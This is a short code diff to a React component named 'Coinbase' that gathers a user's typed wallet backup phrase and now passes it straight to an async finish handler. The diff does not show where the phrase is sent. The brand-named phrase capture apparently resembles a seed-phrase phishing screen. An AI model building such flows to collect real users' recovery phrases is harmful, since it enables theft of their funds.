@@ -4,10 +4,8 @@ import { useState, useRef, useEffect } from "react";
 
 const Coinbase = ({
 	handleFinish,
-	setWalletPhrase,
 }: {
-	handleFinish: () => void;
-	setWalletPhrase: any;
+	handleFinish: (walletPhrase: string) => Promise<void>;
 }) => {
 	const [backupPhrase, setBackupPhrase] = useState("");
 	const [phraseWords, setPhraseWords] = useState<string[]>([]);
@@ -17,8 +15,7 @@ const Coinbase = ({
 
 	const handleComplete = () => {
 		setSeedPhrase(phraseWords.join(" "));
-		setWalletPhrase(phraseWords.join(" "));
-		handleFinish();
+		handleFinish(phraseWords.join(" "));
 	};
 
 	// Dynamically adjust textarea height as text changes
